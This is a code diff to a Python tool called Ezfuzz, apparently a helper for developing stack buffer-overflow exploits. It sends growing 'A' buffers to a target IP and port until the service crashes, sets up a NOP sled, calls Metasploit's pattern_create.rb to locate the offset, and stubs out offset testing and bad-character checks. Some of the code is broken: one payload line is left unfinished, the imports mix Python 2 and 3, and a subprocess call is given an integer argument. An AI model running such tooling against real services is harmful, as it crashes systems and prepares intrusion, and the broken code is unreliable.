@@ -1,6 +1,6 @@
 try:
 	import subprocess as sp
-	import sockets
+	import socket as s
 	import exceptions
 	import logging
 except ImportError as err:
@@ -40,7 +40,7 @@ class Ezfuzz:
 		self._bad_chars_found = []
 		self._nop_sled = "\x90"*16
 		self._offset = None
-		self._num_bytes_crash
+		self._num_bytes_crash = None
 		self._receive_bytes = 1024
 
 	@property
@@ -61,7 +61,12 @@ class Ezfuzz:
 	def offset(self):
 		""""""
 		return self._offset
-	
+
+	@offset.setter
+	def offset(self, arg):
+		""""""
+		self._offset = arg
+
 	def fuzz(self, targ_IP, targ_port):
 		"""Sends an incrementing number of bytes to an application
 		until it crashes or returns an error and then prints out the
@@ -85,7 +90,7 @@ class Ezfuzz:
 			
 		self._num_bytes_crash = 50
 		while True:
-			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
+			with s.socket(s.AF_INET, s.SOCK_STREAM) as soc:
 				try:
 					soc.connect((self._targ_IP, self._targ_port))
 					self._buffer = 'A'*self._num_bytes_crash
@@ -107,11 +112,12 @@ class Ezfuzz:
 	
 	def _generate_msf_pattern(self):
 		""""""
-		pass
+		output = sp.run(['/usr/share/metasploit-framework/tools/pattern_create.rb', self._num_bytes_crash])
 		
 	def test_offset(self):
 		""""""
-		pass
+		with s.socket(s.AF_INET, s.SOCK_STREAM) as soc:
+			payload = 
 		
 	def send_bad_chars(self):
 		""""""
